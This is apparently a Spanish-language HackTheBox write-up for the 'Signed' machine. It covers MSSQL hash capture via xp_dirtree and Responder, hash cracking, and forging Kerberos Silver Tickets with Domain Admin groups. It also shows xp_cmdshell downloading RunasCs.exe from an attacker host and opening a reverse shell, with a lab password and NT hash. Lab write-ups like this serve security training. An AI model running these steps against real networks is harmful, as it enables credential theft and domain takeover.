⚡ Signed – Por xcotelo

* **Dificultad:** Media  
* **IP:** `10.10.11.90`  
* **Fecha de finalización:** 12/10/2025  
* **Plataforma:** HackTheBox

---

## 🔎 Enumeración

### 🔎 Nmap — escaneo inicial

Se realizó un escaneo agresivo completo para identificar servicios y versiones:

```bash
nmap -sV -sC -n -Pn --min-rate 5000 --open 10.10.11.90
```

**Hallazgos**

* 1 puerto abierto:

  * `1433/tcp` → Microsoft SQL Server 2022 RTM (v16.00.1000.00)  
* Información de dominio filtrada:

  * **Dominio NetBIOS:** `SIGNED`  
  * **Nombre del equipo:** `DC01`  
  * **Dominio DNS:** `SIGNED.HTB`  
  * **Host DNS:** `DC01.SIGNED.HTB`

---

<img width="1902" height="745" alt="1" src="https://github.com/user-attachments/assets/a5720841-9e12-4a68-9a75-51307fa588a5" />

---

## 🧩 Enumeración MSSQL

### Antes de empezar, actualizar el archivo hosts

```bash
sudo echo "10.10.11.90 DC01.SIGNED.HTB SIGNED.HTB" > /etc/hosts
```

---

### Acceso inicial — Conexión con credenciales proporcionadas

Usando las credenciales scott / Sm230#C5NatH:

```bash
impacket-mssqlclient signed.htb/scott:'Sm230#C5NatH'@10.10.11.90
```

**Resultado:**  
Conectado correctamente como el usuario `scott` (mapeado como `guest` en SQL).

---

<img width="1881" height="244" alt="3" src="https://github.com/user-attachments/assets/31c5f393-7f15-4581-8076-538e8e094546" />

---

### Intento de habilitar xp_cmdshell (intento inicial)

* No podemos habilitar xp_cmdshell mediante `enable_xp_cmdshell` porque no tenemos los permisos necesarios para hacerlo.

---

### Buscar otros usuarios

Enumeramos los usuarios con el siguiente comando:

```sql
enum_users
```

**Resultado:** El resultado muestra los usuarios de la base de datos msdb: dbo está mapeado al como db_owner, guest no tiene login mapeado, INFORMATION_SCHEMA y sys son usuarios del sistema.

---

<img width="1392" height="245" alt="5" src="https://github.com/user-attachments/assets/c3bc1f77-fd2d-4317-8cdd-e42ebd073ef0" />


---

### Comprobar otros procedimientos almacenados

Comprobar existencia de `xp_dirtree` y permisos de ejecución:

```sql
SELECT OBJECT_ID('master..xp_dirtree') AS objid;
SELECT HAS_PERMS_BY_NAME('master..xp_dirtree','OBJECT','EXECUTE') AS can_execute_xp_dirtree;
```

**Resultado:** `xp_dirtree` existe y `HAS_PERMS_BY_NAME` devuelve `1` — tenemos derechos de EXECUTE sobre él.

---

<img width="1435" height="232" alt="6" src="https://github.com/user-attachments/assets/89ec0ca8-7f47-46a7-b58b-de32b0fb0a63" />


---

### Iniciar Responder (desde nuestra maquina atacante)

```bash
responder -I tun0
```

Forzar a que el servicio SQL se conecte al SMB del atacante mediante `xp_dirtree`:

```sql
xp_dirtree \\10.10.**.**\share
```

**Resultado:** asi obtenemos el hash NTLMv2 del usuario `mssqlsvc`.

Guardamos el hash capturado como `mssqlsvc.hash` (o como se prefiera, el nombre es indiferente).

---

<img width="1866" height="498" alt="7" src="https://github.com/user-attachments/assets/ceaba465-507b-45de-ba67-742205324c1c" />

---

### Usamos john para crackear el hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt mssqlsvc.hash
```

**Resultado:** contraseña crackeada

---

<img width="1843" height="221" alt="8" src="https://github.com/user-attachments/assets/74f5c3ae-f7b7-4c88-b934-c7c2e7f4b2f2" />

---

## Movimiento lateral — Conectar como mssqlsvc

Conectarse usando la cuenta de servicio con la contraseña crackeada:

```bash
impacket-mssqlclient 'signed.htb/mssqlsvc:*********'@10.10.11.90 -windows-auth
```

---

<img width="1596" height="244" alt="9" src="https://github.com/user-attachments/assets/462a0e1e-4764-4568-bcba-9ab784aa7467" />

---

Enumerar roles del servidor:

```sql
SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id=rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id=m.principal_id WHERE r.name='sysadmin';
```

**Notas:** `sysadmin` contiene `sa`, `SIGNED\\IT`, y varias cuentas de servicio (NT SERVICE\\SQLWriter, NT SERVICE\\Winmgmt, NT SERVICE\\MSSQLSERVER, NT SERVICE\\SQLSERVERAGENT) — esas cuentas tienen privilegios sysadmin en el servidor.

---

<img width="1866" height="351" alt="10" src="https://github.com/user-attachments/assets/565219f3-cd3d-4699-963e-14d094dbbf61" />

---

## 🎟️ Silver Ticket — paso a paso

Explicacion: Un Silver Ticket es un ticket Kerberos TGS falsificado que se crea usando el hash de una cuenta de servicio, y permite autenticarse directamente contra un servicio dentro del dominio sin pasar por el controlador de dominio.

### Recuperar nombre del dominio y SIDs

Comandos:

```sql
select DEFAULT_DOMAIN() as mydomain;
select SUSER_SID('SIGNED\\IT')
```

---

<img width="1686" height="241" alt="11" src="https://github.com/user-attachments/assets/386951ec-7ff2-4e90-a831-f2dd58fdf6bc" />

---

Convertir el SID en hex desde la salida SQL al formato S-1-... usando el snippet de Python proporcionado (literal):

```bash
python3 - <<'PY'

hexs = "0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000"  # replace with your hex (no 0x)

b = bytes.fromhex(hexs)

rev = b[0]

subc = b[1]

ident = int.from_bytes(b[2:8], 'big')

subs = [str(int.from_bytes(b[8+4*i:12+4*i], 'little')) for i in range(subc)]

sid = f"S-{rev}-{ident}" + ''.join('-' + s for s in subs)

print(sid)

PY
```

---

<img width="1863" height="435" alt="12" src="https://github.com/user-attachments/assets/715bb47f-d065-406f-95c9-2f475219ea38" />

---

(Repetir para el hex de `SIGNED\\mssqlsvc`.)

---

**Ejemplos de resultado:**

* SID de dominio: `S-1-5-21-4088429403-1159899800-2753317549`  
* RID del grupo IT: `1105`  
* RID de mssqlsvc: `1103`

---

### Calcular el hash NTLM

```bash
printf 'purPLE9795!@' | iconv -t UTF-16LE | openssl dgst -md4
```

**Hash NT:** `ef699384c32*********************`

---

### Construir el Silver Ticket con ticketer.py de impacketer

Primero activamos el entorno virtual:

```bash
source /venv/bin/activate
```
```bash
ticketer.py -nthash ef699384********************* -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 -user-id 1103 mssqlsvc
```

---

<img width="1870" height="427" alt="16" src="https://github.com/user-attachments/assets/74dc478e-bcc4-4fd3-96ce-4e950cc44313" />

---

Establecer el nombre de cache de Kerberos:

```bash
export KRB5CCNAME=mssqlsvc.ccache
```

Despues, conectar con Kerberos:

```bash
mssqlclient.py  -k -no-pass DC01.SIGNED.HTB
```

**Descripción:** Asi, con estes ticket, podremos obtener acceso a privilegiado como sysadmin.

---

<img width="1843" height="267" alt="17" src="https://github.com/user-attachments/assets/2b21ec62-9156-445b-85c8-170c8734b4cb" />

---

## 🧠 Acceso a shell y habilitar xp_cmdshell

**Una vez conectado como `SIGNED\\mssqlsvc dbo@master` (db_owner), para obtener shell:**

Arrancar un servidor HTTP (atacante):

```bash
python3 -m http.server 80
```

En el servidor MSSQL, usar `xp_cmdshell` para descargar `rucascs.exe`:

```sql
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.216/RunasCs.exe -OutFile C:\\temp\\runascs.exe"';
```

---

<img width="1869" height="479" alt="18" src="https://github.com/user-attachments/assets/f836a143-8ed2-44d2-83de-27769bc21678" />

---

Luego arrancamos un listener con netcat listener:

```bash
nc -nlvp 4444
```

Obtenemos una reverse shell con `xp_cmdshell` y `rucascs.exe`:

```sql
EXEC xp_cmdshell 'C:\\temp\\runascs.exe -l 4444 -r 10.10.**.**';
```

**Resultado:** conseguimos shell como `mssqlsvc`.

Ahora podremos leer la flag de user:

```bash
type C:\\Users\\mssqlsvc\\Desktop\\user.txt
```

✅ **Flag de user obtenida.**

---

<img width="1873" height="453" alt="19 real" src="https://github.com/user-attachments/assets/f0d1a6df-66c6-4e00-bd9d-b6ae8f167158" />

---

## 🔧 Escalada de privilegios — De Silver Ticket a Administrador / Root

*Incluir Domain Admins (RID 512) y Enterprise Admins (RID 519) en el ticket forjado para que reclame membresía en esos grupos privilegiados y permita acceder a archivos del Administrador.*

Para obtener sus SIDs hacemos lo mismo que antes — por ejemplo en SQL:

```bash
SELECT SUSER_SID('SIGNED\\Domain Admins');
SELECT SUSER_SID('SIGNED\\Enterprise Admins');
```

---

<img width="1861" height="231" alt="19" src="https://github.com/user-attachments/assets/549dd160-4d78-468f-aa11-d70285a39463" />

---

Creamos otro Silver Ticket para mssqlsvc usando los nuevos grupos:

```bash
ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -groups 512,519,1105 -user-id 1103 mssqlsvc
```

---

<img width="1858" height="357" alt="20" src="https://github.com/user-attachments/assets/0bb8f163-8ae3-432d-bf51-73487695b6b2" />

---

Repetimos el mismo proceso que con el usuario anterior:

```bash
export KRB5CCNAME=mssqlsvc.ccache
mssqlclient.py -k -no-pass DC01.SIGNED.HTB
```

---

<img width="1860" height="275" alt="21" src="https://github.com/user-attachments/assets/b2497578-58c3-470d-8c4c-df36c680b40d" />

---

Habilitar opciones avanzadas y Ad Hoc Distributed Queries:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'Ad Hoc Distributed Queries', 1; RECONFIGURE;
```

---

Leer `root.txt` del Administrador vía `OPENROWSET`:

```sql
SELECT * FROM OPENROWSET(BULK 'C:\\Users\\Administrator\\Desktop\\root.txt', SINGLE_CLOB) AS x;
```

✅ **Flag root obtenida.**

---

<img width="700" height="549" alt="image" src="https://github.com/user-attachments/assets/b0dadd03-48a6-4365-8f52-2de6ec244d53" />
